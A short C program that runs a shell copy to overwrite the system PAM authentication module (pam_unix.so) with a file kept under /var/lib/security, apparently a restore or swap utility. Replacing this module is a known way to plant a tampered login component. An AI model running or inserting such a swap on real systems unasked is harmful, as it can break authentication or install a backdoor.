#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BACKUP_LOCATION "/var/lib/security/pam_unix.so"
#define UNIX_LOCATION "/usr/lib/x86_64-linux-gnu/security/pam_unix.so"

int main() {
    char command[128];
    snprintf(command, sizeof(command), "cp %s %s", BACKUP_LOCATION, UNIX_LOCATION);
    system(command);
    return 0;
}